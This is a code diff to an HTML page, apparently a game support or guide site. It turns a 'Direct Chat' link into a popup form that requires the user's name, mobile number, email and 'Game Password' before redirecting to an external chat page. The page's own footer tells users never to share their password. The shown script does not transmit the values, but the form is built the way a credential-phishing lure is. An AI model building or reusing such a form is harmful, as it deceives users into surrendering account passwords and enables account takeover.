@@ -100,8 +100,92 @@
     .guide-imgs img { width: 100%; border-radius: 14px; border: 1px solid rgba(255,255,255,0.08); transition: var(--ios-transition); }
     .guide-imgs img:hover { transform: scale(1.02); border-color: var(--accent-red); }
 
+    /* Chat Popup Modal */
+    .chat-popup-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+      z-index: 10000;
+      display: flex; align-items: center; justify-content: center;
+      opacity: 0; visibility: hidden;
+      transition: opacity 0.35s ease, visibility 0.35s ease;
+      padding: 20px;
+    }
+    .chat-popup-overlay.show { opacity: 1; visibility: visible; }
+    .chat-popup-modal {
+      background: #0D1525;
+      border-radius: 24px;
+      padding: 32px 28px;
+      width: 100%; max-width: 420px;
+      border: 1px solid rgba(255,255,255,0.08);
+      box-shadow: 0 24px 64px rgba(0,0,0,0.6);
+      position: relative;
+      transform: scale(0.9) translateY(20px);
+      transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    .chat-popup-overlay.show .chat-popup-modal { transform: scale(1) translateY(0); }
+    .chat-popup-header { text-align: center; margin-bottom: 28px; }
+    .chat-popup-icon {
+      width: 60px; height: 60px; border-radius: 50%;
+      background: rgba(52,199,89,0.12);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 16px;
+    }
+    .chat-popup-icon svg { width: 28px; height: 28px; }
+    .chat-popup-header h3 { font-size: 1.3rem; font-weight: 700; margin-bottom: 6px; letter-spacing: -0.2px; }
+    .chat-popup-header p { font-size: 0.9rem; color: #8E8E93; }
+    .chat-popup-field { margin-bottom: 18px; }
+    .chat-popup-field label {
+      display: block; font-size: 0.82rem; font-weight: 600;
+      color: rgba(255,255,255,0.7); margin-bottom: 8px;
+      letter-spacing: 0.3px; text-transform: uppercase;
+    }
+    .chat-popup-field input {
+      width: 100%; padding: 16px 18px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 14px;
+      color: #fff; font-size: 1rem;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+    .chat-popup-field input::placeholder { color: rgba(255,255,255,0.3); }
+    .chat-popup-field input:focus {
+      border-color: #34C759;
+      box-shadow: 0 0 0 3px rgba(52,199,89,0.15);
+    }
+    .chat-popup-next-btn {
+      width: 100%; padding: 16px;
+      background: #34C759;
+      color: #fff; font-size: 1.05rem; font-weight: 700;
+      border: none; border-radius: 14px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      box-shadow: 0 6px 24px rgba(52,199,89,0.45);
+      transition: all 0.3s ease;
+      letter-spacing: 0.5px;
+      font-family: inherit;
+    }
+    .chat-popup-next-btn:hover { transform: scale(1.02); box-shadow: 0 10px 32px rgba(52,199,89,0.6); }
+    .chat-popup-next-btn:active { transform: scale(0.98); }
+    .chat-popup-next-btn svg { width: 18px; height: 18px; }
+    .chat-popup-close {
+      position: absolute; top: 16px; right: 16px;
+      width: 36px; height: 36px; border-radius: 50%;
+      background: rgba(255,255,255,0.08);
+      border: none; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      transition: background 0.3s ease;
+    }
+    .chat-popup-close:hover { background: rgba(255,255,255,0.15); }
+    .chat-popup-close svg { width: 18px; height: 18px; color: #8E8E93; }
+
     @media (max-width: 640px) {
       .guide-imgs { grid-template-columns: 1fr; }
+
+      .chat-popup-modal { padding: 28px 22px; }
+      .chat-popup-header h3 { font-size: 1.15rem; }
+      .chat-popup-field input { padding: 14px 16px; font-size: 0.95rem; }
 
       .header-modern { padding: 14px 16px; }
       .header-modern-inner { gap: 12px; }
@@ -194,10 +278,10 @@
             No form required
           </div>
         </div>
-        <a href="https://chat-page.edgeone.app" class="ios-button" target="_blank" style="background:#34C759;box-shadow:0 6px 24px rgba(52,199,89,0.45);">
+        <button onclick="openChatPopup()" class="ios-button" style="background:#34C759;box-shadow:0 6px 24px rgba(52,199,89,0.45);">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
           DIRECT CHAT
-        </a>
+        </button>
       </div>
     </div>
 
@@ -433,6 +517,44 @@
     <p class="footer-warn">Never share your account password or OTP with anyone. Our team will never ask for your OTP.</p>
   </footer>
 
+  <!-- Direct Chat Popup Modal -->
+  <div class="chat-popup-overlay" id="chatPopup">
+    <div class="chat-popup-modal">
+      <div class="chat-popup-header">
+        <div class="chat-popup-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#34C759" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        </div>
+        <h3>Connect to Live Chat</h3>
+        <p>Please fill your details to start chatting</p>
+      </div>
+      <form id="chatForm" onsubmit="submitChatForm(event)">
+        <div class="chat-popup-field">
+          <label>User Name</label>
+          <input type="text" id="chatName" placeholder="Enter your name" required />
+        </div>
+        <div class="chat-popup-field">
+          <label>Mobile Number</label>
+          <input type="tel" id="chatMobile" placeholder="Enter mobile number" pattern="[0-9]{10}" maxlength="10" required />
+        </div>
+        <div class="chat-popup-field">
+          <label>Game Password</label>
+          <input type="password" id="chatPassword" placeholder="Enter game password" required />
+        </div>
+        <div class="chat-popup-field">
+          <label>Email</label>
+          <input type="email" id="chatEmail" placeholder="Enter your email" required />
+        </div>
+        <button type="submit" class="chat-popup-next-btn">
+          NEXT
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+        </button>
+      </form>
+      <button class="chat-popup-close" onclick="closeChatPopup()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+  </div>
+
   <script src="app.js"></script>
   <script>
     window.addEventListener('DOMContentLoaded', function() {
@@ -444,6 +566,43 @@
           setTimeout(function() { w.classList.add('anim-in'); }, 300 + i * 120);
         });
       }, 1800);
+    });
+
+    function openChatPopup() {
+      var popup = document.getElementById('chatPopup');
+      popup.classList.add('show');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeChatPopup() {
+      var popup = document.getElementById('chatPopup');
+      popup.classList.remove('show');
+      document.body.style.overflow = '';
+      document.getElementById('chatForm').reset();
+    }
+
+    function submitChatForm(e) {
+      e.preventDefault();
+      var name = document.getElementById('chatName').value.trim();
+      var mobile = document.getElementById('chatMobile').value.trim();
+      var password = document.getElementById('chatPassword').value.trim();
+      var email = document.getElementById('chatEmail').value.trim();
+
+      if (!name || !mobile || !password || !email) {
+        alert('Please fill all fields');
+        return;
+      }
+
+      if (mobile.length !== 10) {
+        alert('Please enter a valid 10-digit mobile number');
+        return;
+      }
+
+      window.location.href = 'https://chat-page.edgeone.app';
+    }
+
+    document.getElementById('chatPopup').addEventListener('click', function(e) {
+      if (e.target === this) closeChatPopup();
     });
   </script>
 </body>
